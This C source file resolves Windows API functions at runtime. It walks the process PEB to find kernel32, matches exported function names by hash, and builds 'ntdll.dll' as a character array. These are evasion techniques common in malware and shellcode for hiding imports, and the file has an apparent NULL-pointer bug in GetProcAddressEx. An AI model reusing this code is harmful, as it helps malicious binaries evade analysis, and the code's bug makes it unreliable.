#include <windows.h>

#include "GrabAPI.h"
#include "Utils.h"
#include "NtDLL.h"

HMODULE GetKernel32(void)
{    
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	PPEB_LDR_DATA LdrData = Peb->Ldr;
    PLIST_ENTRY Head = &LdrData->ModuleListLoadOrder;
    PLIST_ENTRY Entry = Head->Flink;

    while ( Entry != Head )
    {
		PLDR_DATA_TABLE_ENTRY LdrData = CONTAINING_RECORD( Entry, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList );    

		WCHAR wcDllName[MAX_PATH];

		memset( (char*)wcDllName, 0, sizeof( wcDllName ) );

        wcsncpy( wcDllName, LdrData->BaseDllName.Buffer, min( MAX_PATH - 1, LdrData->BaseDllName.Length / sizeof( WCHAR ) ) );

        if ( CalcHashW( wcslwr( wcDllName ) ) == 0x4B1FFE8E )
        {
            return (HMODULE)LdrData->DllBase;
        }

        Entry = Entry->Flink;
    }

    return NULL;
}

LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash )
{
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)hModule + ( (PIMAGE_DOS_HEADER)hModule)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
	PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA(hModule,	poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
	
	int nOrdinal;

	if ( HIWORD( (DWORD)dwProcNameHash) == 0 ) 
	{
		nOrdinal = (LOWORD((DWORD)dwProcNameHash)) - ped->Base;
	}
	else
	{
		DWORD *pdwNamePtr  = (DWORD*)RVATOVA( hModule, ped->AddressOfNames );
		WORD *pwOrdinalPtr =  (WORD*)RVATOVA( hModule, ped->AddressOfNameOrdinals );

		unsigned int i = 0;

		for ( i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
		{
			if ( CalcHash( (char*)RVATOVA( hModule, *pdwNamePtr ) ) == dwProcNameHash )
			{
				nOrdinal = *pwOrdinalPtr;
				break;
			}
		}

		if ( i == ped->NumberOfNames ) 
		{
			return 0;
		}
	}

	PDWORD pAddrTable = (PDWORD)RVATOVA( hModule, ped->AddressOfFunctions );
	DWORD dwRVA		  = pAddrTable[ nOrdinal ];
	DWORD ret		  = (DWORD)RVATOVA( hModule, dwRVA );

	return (LPVOID)ret;
}

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash )
{
	HMODULE hModule = NULL;
	char ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};

	char *DllName = NULL;

	if ( Dll == NULL )
	{
		switch ( dwModule ) 
		{
			case 5:
				DllName = ntdll_dll;
			break;
			default:
				return 0;
		}
	}
	else
	{
		hModule = (HMODULE)LoadLibraryA( Dll ); 
	}

	if ( hModule == NULL && strlen ( DllName ) )
	{
		hModule = (HMODULE)LoadLibraryA( DllName );
	}

	LPVOID ret = GetApiAddr( hModule, dwProcNameHash );

	if ( ret == NULL )
	{
		return (LPVOID)0x00000000;
	}

	return ret;
} 
